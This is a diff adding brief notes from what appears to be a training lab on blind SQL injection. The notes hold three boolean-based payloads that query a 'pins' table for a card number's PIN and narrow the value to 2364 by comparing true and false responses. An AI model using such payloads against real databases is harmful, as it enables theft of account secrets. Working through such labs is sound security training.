@@ -1,0 +1,7 @@
+101 AND (SELECT pin FROM pins where cc_number=1111222233334444) > 2363; -- RETURNS TRUE
+
+101 AND (SELECT pin FROM pins where cc_number=1111222233334444) > 2364; -- RETURNS FALSE
+
+101 AND (SELECT pin FROM pins where cc_number=1111222233334444) = 2364; -- RETURNS TRUE
+
+Implies value is 2364
